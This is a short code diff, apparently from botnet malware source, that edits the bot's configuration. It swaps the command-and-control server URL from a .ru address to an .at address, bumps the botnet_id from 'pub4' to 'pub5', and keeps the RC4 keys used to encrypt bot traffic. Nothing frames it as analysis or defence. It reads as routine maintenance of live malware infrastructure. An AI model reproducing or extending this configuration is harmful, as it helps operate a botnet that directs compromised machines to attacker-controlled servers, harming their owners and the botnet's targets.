@@ -13,9 +13,10 @@ def main():
     initLogging(0, os.environ["LOG_PATH"])
 
     config = {
-        "c2": "http://d-s-p.ru/tmp/index.php",
+        # "c2": "http://d-s-p.ru/tmp/index.php",
         # "c2": "http://127.0.0.1",
-        "botnet_id": "pub4",
+        "c2": "http://bahninfo.at/upload/",
+        "botnet_id": "pub5",
         "rc4_encrypt_key": 992142656,
         "rc4_decrypt_key": 2796787680
     }
